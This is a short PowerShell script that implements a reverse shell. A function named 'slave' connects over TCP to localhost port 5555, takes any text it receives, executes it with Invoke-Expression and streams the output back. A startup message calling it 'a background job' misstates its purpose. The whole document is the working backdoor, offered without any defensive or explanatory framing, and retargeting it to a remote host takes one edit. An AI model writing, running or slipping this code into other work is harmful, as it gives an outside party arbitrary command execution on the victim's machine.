write-output "running a background job"; 
function slave(){ $client = New-Object System.Net.Sockets.TcpClient("localhost",5555); 
while($client.connected){
$stream = $client.GetStream(); 
$bytes=New-Object System.Byte[] 4096; 
$recv=(New-Object System.Text.AsciiEncoding).GetString($bytes,0,$stream.Read($bytes,0,$bytes.length)); 
$wr=New-Object System.IO.StreamWriter($stream); 
$msg=iex "$recv 2>&1";
$msg | %{$wr.Write("$_ \n"); $wr.flush()}
Write-Output "Writed!";
}}
slave

